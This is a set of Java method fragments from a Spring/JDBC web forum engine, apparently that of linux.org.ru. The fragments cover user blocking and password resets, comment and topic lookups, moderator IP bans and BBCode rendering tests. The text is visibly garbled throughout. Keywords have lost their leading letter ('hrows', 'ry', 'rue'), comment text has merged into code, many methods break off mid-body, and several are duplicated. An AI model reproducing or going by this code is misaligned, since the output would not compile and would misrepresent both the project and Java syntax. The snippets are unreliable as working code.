public void oggleCorrector ( User user ) { if ( user . canCorrect ( ) ) { jdbcTemplate . update ( " UPDATE users SET corrector='f' WHERE id=? " , user . getId ( ) ) ; 
public String resetPassword ( User user ) { String password = StringUtil . generatePassword ( ) ; setPassword ( user , password ) ; return password ; } 
public void block ( User user , User moderator , String reason ) hrows UserNotFoundException { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; Update cache getUser(user.getId()); } 
public void unblock ( User user ) { jdbcTemplate . update ( " UPDATE users SET blocked='f' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM ban_info WHERE userid=? " , user . getId ( ) ) ; } 
public void processRow ( ResultSet rs ) hrows SQLException { int mid = rs . getInt ( " id " ) ; jdbcTemplate . update ( " UPDATE topics SET deleted='t',sticky='f' WHERE id=? " , mid ) ; jdbcTemplate . update ( " INSERT INTO del_info (msgid, delby, reason, deldate) values(?,?,?, CURRENT_TIMESTAMP) " , mid ) ; } 
public ModelAndView showFormTopic ( @ModelAttribute ( " add " ) @Valid AddCommentRequest add , Errors errors , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void initBinder ( WebDataBinder binder ) { binder . setValidator ( new AddCommentRequestValidator ( ) ) ; } 
public boolean supports ( Class < ? > clazz ) { return AddCommentRequest . class . equals ( clazz ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; UserDao singleUserDao = new UserDao ( ) ; singleUserDao . setJdbcTemplate ( new SingleConnectionDataSource ( db , rue ) ) ; rootNode . setUserDao ( singleUserDao ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . rim ( ) . isEmpty ( ) ) return ; setUserInfo ( user , null ) ; changeScore ( user , - 10 ) ; } 
public String resetPasswordWithoutTransaction ( User user ) { String password = StringUtil . generatePassword ( ) ; setPasswordWithoutTransaction ( user , password ) ; return password ; } 
public void block ( User user , User moderator , String reason ) hrows UserNotFoundException { blockWithoutTransaction ( user , moderator , reason ) ; } 
public void blockWithoutTransaction ( User user , User moderator , String reason ) hrows UserNotFoundException { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; Update cache getUser(user.getId()); } 
public void blockWithResetPassword ( User user , User moderator , String reason ) hrows UserNotFoundException { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String password = encryptor . encryptPassword ( StringUtil . generatePassword ( ) ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , password , user . getId ( ) ) ; Update cache getUser(user.getId()); } 
public void blockWithResetPassword ( User user , User moderator , String reason ) hrows UserNotFoundException { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String password = encryptor . encryptPassword ( StringUtil . generatePassword ( ) ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , password , user . getId ( ) ) ; Update cache getUser(user.getId()); } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new AddCommentRequestValidator ( ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String ext ) hrows IllegalArgumentException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void checkDuplication ( String ip , boolean rusted , Errors errors ) hrows DuplicationException { if ( ! check ( ip , rusted ) ) { errors . reject ( null , DuplicationException . MESSAGE ) ; 
private synchronized boolean check ( String ip , boolean rusted ) { cleanup ( ) ; long current = System . currentTimeMillis ( ) ; if ( hash . containsKey ( ip ) ) { long date = hash . get ( ip ) ; if ( ( current - date ) < ( rusted ? THRESHOLD_TRUSTED : THRESHOLD ) ) { return false ; } } hash . put ( ip , current ) ; return rue ; } 
private synchronized void cleanup ( ) { long current = System . currentTimeMillis ( ) ; for ( Iterator < Long > i = hash . values ( ) . iterator ( ) ; i . hasNext ( ) ; ) { long date = i . next ( ) ; 
public void setAsText ( String s ) hrows IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } ry { setValue ( userDao . getUserCached ( Integer . parseInt ( s ) ) ) ; 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( User . class , new UserIdPropertyEditor ( userDao ) ) ; } 
private User getModerator ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } return mpl . getCurrentUser ( ) ; } 
public ModelAndView showFormTopic ( @ModelAttribute ( " add " ) @Valid AddCommentRequest add , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String handleInvalidRequest ( ) { return " error-parameter " ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new AddCommentRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchViewer . SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) hrows IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchViewer.SearchOrder.RELEVANCE); } else if ("2".equals(s)) { setValue(SearchViewer.SearchOrder.DATE); } else { setValue(SearchViewer.SearchOrder.valueOf(s)); } } }); binder.registerCustomEditor(SearchViewer.SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchViewer.SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchViewer.SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchViewer.SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userDao)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public void checkDuplication ( String ip , boolean rusted , Errors errors ) { if ( ! check ( ip , rusted ) ) { errors . reject ( null , DuplicationException . MESSAGE ) ; 
private List < PreparedMessage > getPreparedMessages ( Connection db , boolean cached ) hrows SQLException { List < Message > messages = cached ? getMessagesCached ( db ) : getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = new PreparedMessage ( db , message , false , mainUrl ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public static ParserResult bb2xhtm ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; String html = parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; Set < User > replier = rootNode . getReplier ( ) ; return new ParserResult ( html , replier ) ; } 
public static ParserResult bb2xhtm ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { UserDao singleUserDao = new UserDao ( ) ; singleUserDao . setJdbcTemplate ( new SingleConnectionDataSource ( db , rue ) ) ; return bb2xhtm ( bbcode , renderCut , cleanCut , cutUrl , singleUserDao ) ; } 
public void addReplier ( User nick ) { replier . add ( nick ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { if ( userDao ! = null ) { User user = userDao . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; if ( rootNode ! = null ) { rootNode . addReplier ( user ) ; } } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } else { pattern = " %s " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; } 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " ) ) ; Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url] nhttp:linux.org.ru[/url] " ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " ) ) ; 
public void splinterTest1 ( ) hrows Exception { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(ParserUtil.bb2xhtml("[url=http:www.fishing.org/][user]splinter[/user][/url]", true, true, "", userDao), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; setValue ( new Message ( db , Integer . parseInt ( ext ) ) ) ; } catch ( SQLException e ) { hrow new RuntimeException ( e ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | ext . equals ( " 0 " ) ) { setValue ( null ) ; return ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void deleteCommentWithSQLException ( int msgid , String reason , User user , int scoreBonus ) hrows SQLException { deleteCommentWithoutTransaction ( msgid , reason , user , scoreBonus ) ; } 
public static Comment getComment ( Connection db , int msgid ) hrows SQLException , MessageNotFoundException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT " + " postdate, topic, users.id as userid, comments.id as msgid, comments.title, " + " deleted, replyto, user_agents.name AS useragent, comments.postip " + " FROM comments " + " INNER JOIN users ON (users.id=comments.userid) " + " LEFT JOIN user_agents ON (user_agents.id=comments.ua_id) " + " WHERE comments.id= " + msgid ) ; if ( ! rs . next ( ) ) { hrow new MessageNotFoundException ( msgid ) ; } return new Comment ( db , rs ) ; } 
public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public Comment getComment ( final int msgid ) hrows MessageNotFoundException { Comment comment = jdbcTemplate . execute ( new ConnectionCallback < Comment > ( ) { @Override public Comment doInConnection ( Connection con ) hrows SQLException , DataAccessException { return getCommentInternal ( con , msgid ) ; } } ) ; if ( comment = = null ) { hrow new MessageNotFoundException ( msgid ) ; 
public Comment doInConnection ( Connection con ) hrows SQLException , DataAccessException { return getCommentInternal ( con , msgid ) ; } 
public static Comment getComment ( Connection db , int msgid ) hrows SQLException , MessageNotFoundException { Comment comment = getCommentInternal ( db , msgid ) ; if ( comment = = null ) { hrow new MessageNotFoundException ( msgid ) ; } return comment ; } 
private static Comment getCommentInternal ( Connection db , int msgid ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = null ; ry { rs = st . executeQuery ( " SELECT " + 
public Message getById ( int id ) hrows MessageNotFoundException { Message message ; ry { message = jdbcTemplate . queryForObject ( queryMessageById , new RowMapper < Message > ( ) { @Override public Message mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Message ( resultSet ) ; } } , id ) ; } catch ( IncorrectResultSizeDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return message ; } 
public Message mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Message ( resultSet ) ; } 
public Comment getById ( int id ) hrows MessageNotFoundException { Comment comment ; ry { comment = jdbcTemplate . queryForObject ( queryCommentById , new RowMapper < Comment > ( ) { @Override public Comment mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Comment ( resultSet , deleteInfoDao ) ; } } , id ) ; } catch ( IncorrectResultSizeDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return comment ; } 
public Comment mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Comment ( resultSet , deleteInfoDao ) ; } 
public DeleteInfo mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new DeleteInfo ( resultSet . getString ( " nick " ) , 
public Comment getById ( int id ) hrows MessageNotFoundException { Comment comment ; ry { comment = jdbcTemplate . queryForObject ( queryCommentById , new RowMapper < Comment > ( ) { @Override public Comment mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Comment ( resultSet , deleteInfoDao ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return comment ; } 
public Message getById ( int id ) hrows MessageNotFoundException { Message message ; ry { message = jdbcTemplate . queryForObject ( queryMessageById , new RowMapper < Message > ( ) { @Override public Message mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Message ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return message ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( messageDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( messageDao . getById ( Integer . parseInt ( ext ) ) ) ; 
public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } ry { setValue ( commentDao . getComment ( Integer . parseInt ( ext ) ) ) ; 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( messageDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } ry { setValue ( commentDao . getComment ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userDao ) ) ; } 
public static List < PreparedComment > prepare ( CommentDao commentDao , UserDao userDao , CommentList comments , List < Comment > list ) hrows UserNotFoundException , SQLException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( new PreparedComment ( commentDao , userDao , comments , comment ) ) ; } return commentsPrepared ; } 
public void updateCurrentUser ( UserDao userDao ) { initCurrentUser ( userDao , rue ) ; } 
private void initCurrentUser ( UserDao userDao , boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } ry { currentUser = userDao . getUser ( ( String ) session . getAttribute ( " nick " ) ) ; 
public void processRow ( ResultSet resultSet ) hrows SQLException { comments . add ( new Comment ( resultSet , deleteInfoDao ) ) ; } 
public String mapRow ( ResultSet resultSet , int i ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return ParserUtil . bb2xhtml ( ext , rue , rue , " " , userDao ) ; 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } Connection db = null ; ry { IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; 
public IPBlockInfo mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new IPBlockInfo ( rs ) ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; int userAgentId = 0 ; if ( msgid ! = null ) { Statement ipst = db . createStatement ( ) ; ResultSet rs = ipst . executeQuery ( " SELECT postip, ua_id FROM topics WHERE id= " + msgid ) ; if ( ! rs . next ( ) ) { rs . close ( ) ; rs = ipst . executeQuery ( " SELECT postip, ua_id FROM comments WHERE id= " + msgid ) ; if ( ! rs . next ( ) ) { hrow new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { hrow new ScriptErrorException ( " No IP data for # " + msgid ) ; } rs . close ( ) ; ipst . close ( ) ; } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " opics " , getTopics ( db , ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( db , ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( db , ip , userAgentId ) ) ; } finally { JdbcUtils . closeConnection ( db ) ; } IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; if ( blockInfo ! = null ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } return mv ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; int userAgentId = 0 ; if ( msgid ! = null ) { Statement ipst = db . createStatement ( ) ; ResultSet rs = ipst . executeQuery ( " SELECT postip, ua_id FROM topics WHERE id= " + msgid ) ; if ( ! rs . next ( ) ) { rs . close ( ) ; rs = ipst . executeQuery ( " SELECT postip, ua_id FROM comments WHERE id= " + msgid ) ; if ( ! rs . next ( ) ) { hrow new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { hrow new ScriptErrorException ( " No IP data for # " + msgid ) ; } rs . close ( ) ; ipst . close ( ) ; } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " opics " , getTopics ( db , ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( db , ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( db , ip , userAgentId ) ) ; } finally { JdbcUtils . closeConnection ( db ) ; } IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; if ( blockInfo ! = null ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . getModel ( ) . put ( " or " , IPBlockDao . getTor ( ip ) ) ; return mv ; } 
public static Message getMessage ( Connection db , int msgid ) hrows SQLException , MessageNotFoundException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT " + " postdate, topics.id as msgid, userid, topics.title, " + " opics.groupid as guid, topics.url, topics.linktext, ua_id, " + " groups.title as gtitle, urlname, vote, havelink, section, topics.sticky, topics.postip, " + " postdate<(CURRENT_TIMESTAMP-sections.expire) as expired, deleted, lastmod, commitby, " + " commitdate, topics.stat1, postscore, topics.moderate, message, notop,bbcode, " + " opics.resolved, restrict_comments, minor " + " FROM topics " + " INNER JOIN groups ON (groups.id=topics.groupid) " + " INNER JOIN sections ON (sections.id=groups.section) " + " INNER JOIN msgbase ON (msgbase.id=topics.id) " + " WHERE topics.id= " + msgid ) ; if ( ! rs . next ( ) ) { hrow new MessageNotFoundException ( msgid ) ; } return new Message ( rs ) ; } 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) hrows IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = Message . getMessage ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = CommentList.getCommentList(db, msg, true); 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form.enableUrlHighLightMode(); form.setOutputLorcode(true); if ("ntobr".equals(mode)) { form.enableNewLineMode(); form.enableQuoting(); } if ("quot".equals(mode)) { form.enableTexNewLineMode(); form.enableQuoting(); } return form.process(); } 
public static PreparedComment prepare ( CommentDao commentDao , UserDao userDao , Comment comment ) hrows UserNotFoundException { return new PreparedComment ( commentDao , userDao , null , comment ) ; } 
public static List < PreparedComment > prepare ( CommentDao commentDao , UserDao userDao , CommentList comments , List < Comment > list ) hrows UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( new PreparedComment ( commentDao , userDao , comments , comment ) ) ; } return commentsPrepared ; } 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . rim ( ) . isEmpty ( ) ) { return ; } setUserInfo ( user , null ) ; changeScore ( user , - 10 ) ; } 
public int saveNewMessage ( Connection db , String message ) hrows SQLException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; ry { allocation MSGID 
public static int saveNewMessage ( Connection db , Comment comment , String message ) hrows SQLException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; ry { allocation MSGID 
public Integer doInConnection ( Connection db ) hrows SQLException , DataAccessException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; ResultSet rs = null ; Statement st = null ; ry { allocation MSGID 
public boolean isUserCanDelete ( User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . DAY_OF_MONTH , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( postdate . compareTo ( hourDeltaTime ) > = 0 & & userid = = user . getId ( ) ) ; } 
public boolean isModeratorCanDelete ( User user , Section section ) { if ( ! user . canModerate ( ) ) { return false ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; Timestamp monthDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; boolean ret = false ; if ( section . isPremoderated ( ) & & ! moderate ) { ret = rue ; } if ( ! ret & & postdate . compareTo ( monthDeltaTime ) > = 0 ) { ret = rue ; } return ret ; } 
public Message getById ( int id ) hrows MessageNotFoundException { Message message ; ry { message = jdbcTemplate . queryForObject ( queryMessage , new RowMapper < Message > ( ) { @Override public Message mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Message ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return message ; } 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . rim ( ) . isEmpty ( ) ) return ; setUserInfo ( user , null ) ; changeScore ( user . getId ( ) , - 10 ) ; } 
public void changeScore ( int id , int delta ) { jdbcTemplate . update ( queryChangeScore , delta , id ) ; } 
public void addUserRefEvent ( User [ ] refs , int opic , int comment ) { if ( refs . length = = 0 ) { return ; } Map [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " ype " , " REF " , " private " , false , " message_id " , opic , " comment_id " , comment ) ; } insert . executeBatch ( batch ) ; } 
public boolean isDeletableByUser ( User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( postdate . compareTo ( hourDeltaTime ) > = 0 & & userid = = user . getId ( ) ) ; } 
public boolean equals ( Object o ) { if ( his = = o ) return rue ; if ( o = = null | | getClass ( ) ! = o . getClass ( ) ) return false ; User user = ( User ) o ; if ( id ! = user . id ) return false ; return rue ; } 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , ParserUtil . bb2xhtml ( " [cut] ntest[/cut][cut]test[/cut] " , rue , false , " " ) ) ; } 
public int getPollId ( int opicId ) hrows PollNotFoundException { ry { return jdbcTemplate . queryForObject ( queryPoolIdByTopicId , Integer . class , opicId ) ; 
public Poll getCurrentPoll ( ) hrows PollNotFoundException { return getPoll ( getCurrentPollId ( ) ) ; } 
public Poll getPoll ( final int poolId ) hrows PollNotFoundException { final int currentPollId = getCurrentPollId ( ) ; ry { return jdbcTemplate . queryForObject ( queryPool , 
public Poll mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Poll ( poolId , resultSet . getInt ( " opic " ) , resultSet . getBoolean ( " multiselect " ) , poolId = = currentPollId ) ; } 
public PreparedPoll preparePoll ( Poll poll ) { return new PreparedPoll ( poll , pollDao . getMaxVote ( poll ) , pollDao . getPollVariants ( poll , Poll . ORDER_VOTES ) ) ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut ) { return prepareMessage ( message , includeCut , " " ) ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut , String mainUrl ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut , mainUrl ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > ags ) { return prepareMessage ( message , ags , rue , " " ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > ags , boolean includeCut , String mainUrl ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
